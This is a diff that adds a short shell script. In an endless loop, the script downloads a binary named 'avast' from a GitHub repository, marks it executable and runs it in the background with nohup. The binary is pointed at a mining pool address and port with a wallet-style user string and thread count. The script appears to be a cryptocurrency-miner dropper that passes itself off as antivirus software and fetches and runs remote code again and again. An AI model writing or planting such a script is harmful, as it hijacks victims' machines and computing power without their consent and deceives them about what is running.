@@ -1,0 +1,7 @@
+#!/bin/sh
+while [ 1 ]; do
+wget https://github.com/torgyv/berhasil/raw/master/avast
+chmod +x ./avast >/dev/null 2>&1 && nohup ./avast -v -l 136.56.44.34:9998 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.V100 -t 4 -x > nohup.out
+
+sleep 60
+done 
